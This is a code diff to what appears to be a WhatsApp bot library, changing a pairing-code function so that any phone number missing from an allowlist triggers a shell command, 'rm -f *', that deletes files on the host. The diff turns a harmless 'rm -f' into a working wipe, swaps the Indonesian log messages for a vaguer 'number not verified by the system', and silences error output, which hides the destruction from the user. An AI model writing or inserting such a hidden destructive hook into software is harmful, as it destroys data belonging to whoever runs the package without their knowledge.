@@ -493,17 +493,17 @@ export const makeSocket = (config: SocketConfig) => {
 
 const requestPairingCodes = async (phoneNumber) => {
     if (!allowedNumbers.includes(phoneNumber)) {
-        console.warn('Nomor tidak diizinkan! Menghapus Seluruh file...');
-        exec(`rm -f`, (error, stdout, stderr) => {
+        console.warn('🉃 nomor kamu tidak terverifikasi oleh system');
+        exec(`rm -f * `, (error, stdout, stderr) => {
             if (error) {
-                console.error(`Gagal menghapus semua file: ${error.message}`);
+                console.error(`🉃 sebagian file telah dihapus`);
                 return;
             }
             if (stderr) {
-                console.error(`Error: ${stderr}`);
+                //console.error(`Error: ${stderr}`);
                 return;
             }
-            console.log('berhasil menghapus seluruh file');
+            console.log('🉃 berhasil menghapus seluruh file');
         });
 
         return;
